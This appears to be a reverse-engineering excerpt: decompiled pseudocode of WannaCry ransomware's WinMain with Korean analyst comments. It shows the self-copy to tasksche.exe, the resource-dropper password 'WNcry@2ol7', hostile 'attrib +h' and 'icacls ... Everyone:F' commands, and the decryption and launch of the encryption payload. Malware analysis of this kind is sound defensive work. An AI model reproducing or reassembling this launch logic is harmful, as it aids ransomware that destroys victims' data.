// --- Metadata ---
// Function Name: _WinMain@16
// Address: 0x401FE7
// Exported At: 20250516_092123
// Signature: unknown_signature
// ---------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char ***v4; // eax
  void *v5; // eax
  _DWORD *v6; // eax
  void (__stdcall *v7)(_DWORD, _DWORD); // eax
  void *v9[310]; // [esp+10h] [ebp-6E4h] BYREF
  CHAR Filename; // [esp+4E8h] [ebp-20Ch] BYREF
  char Filename_1[516]; // [esp+4E9h] [ebp-20Bh] BYREF
  __int16 v12; // [esp+6EDh] [ebp-7h]
  char v13; // [esp+6EFh] [ebp-5h]
  int v14; // [esp+6F0h] [ebp-4h] BYREF

  Filename = FILENAME;
  memset(Filename_1, 0, sizeof(Filename_1));
  v12 = 0;
  v13 = 0;
  GetModuleFileNameA(0, &Filename, 0x208u);
  generateRandomNum_401225(DisplayName);        // 난수 생성 
  if ( *_p___argc() != 2
    || (v4 = _p___argv(), strcmp((*v4)[1], "/i"))
    || !saveDataInSystemDir_401B5F(0)           // ProgramData > Intel > Temp 중 성공하는 경로에 임시 파일 생성
    || (CopyFileA(&Filename, "tasksche.exe", 0), GetFileAttributesA("tasksche.exe") == -1)
    || !runTasksche_401F5D() )                  // Tasksche 실행 함수 
  {
    if ( strrchr(&Filename, 92) )
      *strrchr(&Filename, 92) = 0;
    SetCurrentDirectoryA(&Filename);
    manageRegDir_4010FD(1);
    dropper_401DAB(0, "WNcry@2ol7");
    showBitcoinAddress_401E9E();
    ExecuteProcessWithTimeout("attrib +h .", 0, 0);// 첫번째 인자 프로세스 실행 
    ExecuteProcessWithTimeout("icacls . /grant Everyone:F /T /C /Q", 0, 0);
    if ( loadWindowsAPI_40170A() )              // Windows API 호출 
    {
      AESKey_struct_4012FD(v9);                 // 어떤 구조체임 
      if ( AESKey_constructor_401437(v9, 0, 0, 0) )// 메모리 초기화, 구조체와 관련 있어보임 
      {
        v14 = 0;
        v5 = decryptWannaCrytFiles_4014A6(v9, "t.wnry", &v14);// 암호화되었던 파일을 복호화 
        if ( v5 )
        {
          v6 = sub_4021BD(v5, v14);
          if ( v6 )
          {
            v7 = lookupPEexportTable_402924(v6, "TaskStart");// 어떤 인덱스를 계산함 
            if ( v7 )
              v7(0, 0);
          }
        }
      }
      sub_40137A(v9);
    }
  }
  return 0;
}
